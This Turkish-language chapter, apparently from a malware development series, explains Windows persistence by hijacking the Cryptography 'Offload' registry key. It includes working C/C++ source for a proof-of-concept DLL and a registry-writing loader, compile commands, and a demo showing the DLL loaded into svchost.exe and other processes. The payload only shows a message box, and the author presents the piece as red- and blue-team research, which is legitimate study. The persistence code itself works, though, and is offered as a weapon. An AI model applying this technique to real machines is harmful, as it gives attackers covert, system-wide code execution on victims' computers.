\newpage
\subsection{82. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 16. Kriptografi Kayıt Defteri anahtarları. Basit C++ örneği}

﷽

![pers](./images/76/2022-10-21_05-25.png){width="80%"}    

Bu makale, kötü amaçlı yazılımların **kalıcılığı sağlamak için** kullanabileceği ilginç bir teknik üzerine yaptığım araştırmanın bir sonucudur: **Kriptografi Kayıt Defteri Anahtarı aracılığıyla kalıcılık**.    

Kayıt defterini incelerken ilginç bir yol keşfettim:    

`HKLM\Software\Microsoft\Cryptography\`     

Bu yol altında `OffloadModExpo` adlı bir fonksiyon bulunmaktadır. Anladığım kadarıyla, bu işlev hem açık anahtar hem de özel anahtar işlemleri için modüler üs alma işlemlerini gerçekleştirmek için kullanılıyor.     

![pers](./images/76/2022-10-21_05-45.png){width="80%"}    

Detaylara çok fazla girmedim, ancak bu anahtar ve değeri Windows kayıt defterinde değiştirme olasılığı benim için yeterince ilginçti. Bu yüzden bu DLL yolunu ele geçirmeyi denedim:    

`HKLM\Software\Microsoft\Cryptography\Offload` ve anahtar değeri.    

### pratik örnek

Öncelikle, her zamanki gibi "kötü amaçlı" bir DLL oluşturuyoruz. Basit olarak `meow-meow` mesaj kutusu açan bir DLL (`hack.c`):    

```cpp
/*
hack.c - kötü amaçlı DLL
Kriptografi kayıt defteri yolunun kaçırılması
yazar: @cocomelonc
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
      MessageBox(
        NULL,
        "Meow-meow!",
        "=^..^=",
        MB_OK
      );
      break;
    case DLL_PROCESS_DETACH:
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    }
    return TRUE;
}
```

Derleme işlemi:    

```bash
x86_64-w64-mingw32-gcc -shared -o hack.dll hack.c
```

Ve ardından kayıt defteri ele geçirme PoC kodunu oluşturuyoruz (`pers.cpp`):    

```cpp
/*
pers.cpp
Windows kalıcılık yöntemi: Kriptografi DLL yolunu kaçırma
yazar: @cocomelonc
*/

#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // Kayıt defteri yolu
  const char* path = "SOFTWARE\\Microsoft\\Cryptography\\Offload";

  // Kötü amaçlı DLL yolu
  const char* evil = "Z:\\2022-10-21-malware-pers-16\\hack.dll";

  // Anahtar oluşturma
  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, 0);
  if (res == ERROR_SUCCESS) {
    // Kayıt defteri anahtar değerini ayarlama
    RegSetValueEx(hkey, (LPCSTR)"ExpoOffload", 0, REG_SZ, (unsigned char*) evil, strlen(evil));
    RegCloseKey(hkey);
  }

  return 0;
}
```

Deney için ihtiyacım olan tek şey bu.

### demo

Her şeyi çalışırken görelim. Proof-of-Concept kodumuzu derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![pers](./images/76/2022-10-21_05-21.png){width="80%"}    

Daha sonra, deneyin saflığını korumak için kurban makinedeki kayıt defteri anahtarlarını kontrol edelim ve varsa silelim:    

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Cryptography\Offload" /s
```

![pers](./images/76/2022-10-21_05-23.png){width="80%"}    

Ardından, `pers.exe` betiğimizi çalıştırıp tekrar kontrol edelim:     

![pers](./images/76/2022-10-21_05-24.png){width="80%"}    

Şimdi bir şeyler çalıştırmayı deneyeceğim. Örneğin, tarayıcıda `https:\...` bağlantısını açmayı veya arama çubuğunu kullanmayı deneyeceğim.    

![pers](./images/76/2022-10-21_05-25_1.png){width="80%"}    

Arka planda bazı kriptografik işlemler gerçekleştirilirken, ekranda giderek daha fazla açılır pencere göreceğiz.    

![pers](./images/76/2022-10-21_05-27.png){width="80%"}    

![pers](./images/76/2022-10-21_05-27_1.png){width="80%"}    

![pers](./images/76/2022-10-21_05-28.png){width="80%"}    

Ayrıca, durumu incelemek için `Process Hacker 2` programını bile çalıştıramadım.     

![pers](./images/76/2022-10-21_06-09.png){width="80%"}    

Daha sonra sanal makine anlık görüntümü geri yükledim ve şu filtrelerle Sysinternals `Procmon`'u çalıştırdım:     

![pers](./images/76/2022-10-21_06-20.png){width="80%"}    

![pers](./images/76/2022-10-21_06-22.png){width="80%"}    

Ve sonuç olarak:     

![pers](./images/76/2022-10-21_06-24.png){width="80%"}    

![pers](./images/76/2022-10-21_06-25.png){width="80%"}    

Gördüğünüz gibi, belirli bir aşamada benim "kötü amaçlı" `meow-meow` DLL'im `svchost.exe`, `ProcessHacker.exe` ve diğer süreçler tarafından yüklendi.    

Her şey doğru çalıştı. Mükemmel! Perfectly! =^..^=      

Deneyler tamamlandıktan sonra kayıt defteri durumumu geri yükledim:     

![pers](./images/76/2022-10-21_05-33.png){width="80%"}    

Bu taktik ve yöntemin vahşi doğada herhangi bir APT tarafından kullanılıp kullanılmadığını bilmiyorum, ancak bu yazının, özellikle yazılım geliştirirken, mavi takım üyelerinin bu ilginç teknik hakkında farkındalık kazanmasına yardımcı olmasını ve kırmızı takım üyeleri için bir silah eklemesini umuyorum.    

[OffloadModExpo](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa387021(v=vs.85))     
[DLL hijacking](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)     
[DLL hijacking with exported functions](https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html)     
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-10-21-malware-pers-16)     
